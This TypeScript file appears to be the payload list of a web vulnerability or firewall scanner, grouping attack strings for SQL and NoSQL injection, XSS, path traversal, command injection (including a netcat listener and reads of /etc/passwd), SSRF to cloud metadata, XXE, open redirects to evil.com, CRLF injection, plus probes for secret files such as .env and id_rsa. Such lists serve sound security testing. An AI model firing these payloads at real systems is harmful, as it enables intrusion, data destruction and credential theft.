export type PayloadCategory = {
  type: 'ParamCheck' | 'FileCheck';
  payloads: string[];
};

export const PAYLOADS: Record<string, PayloadCategory> = {
  "SQL Injection": {
    type: "ParamCheck",
    payloads: [
      "' OR '1'='1",
      "1; DROP TABLE notablewaftest17 --",
      "admin' --",
      "' OR 1=1--",
      "' OR 'a'='a",
      "' OR 1=1#",
      "' OR 1=1/*",
      "' OR SLEEP(5)--",
      "' OR 1=1 LIMIT 1;--",
      "WAITFOR DELAY '0:0:5'",
      ")) OR EXISTS(SELECT * FROM users WHERE username='admin')--",
      "%2553%2527%2520OR%25201%253D1",  // URL encoded bypass
      "/**/OR/**/1=1",  // Comment bypass
    ]
  },
  "XSS": {
    type: "ParamCheck",
    payloads: [
      "<script>alert('xss')</script>",
      "<img src=x onerror=alert('xss')>",
      "<iframe src=\"javascript:alert('XSS')\"></iframe>",
      "<svg/onload=alert('xss')>",
      "<body onload=alert('xss')>",
      "<a href=javascript:alert('xss')>click</a>",
      "<math href=javascript:alert(1)>",
      "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'",
      "<marquee onstart=alert(1)>",
      "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\"",
      "<input onfocus=alert(1) autofocus>",
    ]
  },
  "Path Traversal": {
    type: "ParamCheck",
    payloads: [
      "../../etc/passwd",
      "../../../../../../../etc/passwd",
      "..\\..\\..\\..\\..\\..\\windows\\win.ini",
      "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
      "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
    ]
  },
  "Command Injection": {
    type: "ParamCheck",
    payloads: [
      "$(cat /etc/passwd)",
      "| cat /etc/passwd",
      "; ls -la",
      "& whoami",
      "| id",
      "; ping -c 10 127.0.0.1",
      "| nc -lvp 4444"
    ]
  },
  "SSRF": {
    type: "ParamCheck",
    payloads: [
      "http://127.0.0.1/",
      "file:///etc/passwd",
      "http://127.0.0.1/latest/meta-data/",
      "http://localhost:80/",
      "http://0.0.0.0:80/",
      "http://[::1]/",
      "http://example.com@127.0.0.1/",
      "http://169.254.169.254/latest/meta-data/",  // AWS metadata
      "http://[::ffff:127.0.0.1]",  // IPv6 bypass
      "http://127.1",  // Short notation
      "http://0177.0.0.1",  // Octal bypass
      "http://2130706433",  // Decimal bypass
    ]
  },
  "NoSQL Injection": {
    type: "ParamCheck",
    payloads: [
      "{'$gt':''}",
      '{"$ne":null}',
      '{"username": {"$ne": null}, "password": {"$ne": null}}',
      '{"$where": "this.password == this.passwordConfirm"}',
      '{"$or": [{}, {}]}'
    ]
  },
  "Local File Inclusion": {
    type: "ParamCheck",
    payloads: [
      "php://filter/convert.base64-encode/resource=index.php",
      "/etc/passwd",
      "../../../../../../../../etc/passwd",
      "..\\..\\..\\..\\windows\\win.ini",
      "/proc/self/environ"
    ]
  },
  "XML External Entity (XXE)": {
    type: "ParamCheck",
    payloads: [
      "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'file:///etc/passwd' >]><foo>&xxe;</foo>",
      "<!DOCTYPE data [<!ENTITY file SYSTEM 'file:///etc/passwd'>]><data>&file;</data>"
    ]
  },
  "Open Redirect": {
    type: "ParamCheck",
    payloads: [
      "//evil.com",
      "http://evil.com",
      "/\\evil.com",
      "//google.com%2F%2Fevil.com"
    ]
  },
  "Sensitive Files": {
    type: "FileCheck",
    payloads: [
      ".git",
      ".git/config",
      ".gitignore",
      "requirements.txt",
      "composer.json",
      "composer.lock",
      "package.json",
      "package-lock.json",
      "yarn.lock",
      "config.php",
      "wp-config.php",
      ".env",
      "docker-compose.yml",
      "id_rsa",
      "id_rsa.pub",
      "web.config",
      "appsettings.json",
      "database.yml",
      ".htpasswd",
      ".htaccess"
    ]
  },
  "CRLF Injection": {
    type: "ParamCheck",
    payloads: [
      "%0d%0aSet-Cookie: malicious=true",
      "\r\nLocation: http://malicious.com",
      "%0d%0aContent-Length:0"
    ]
  }
};
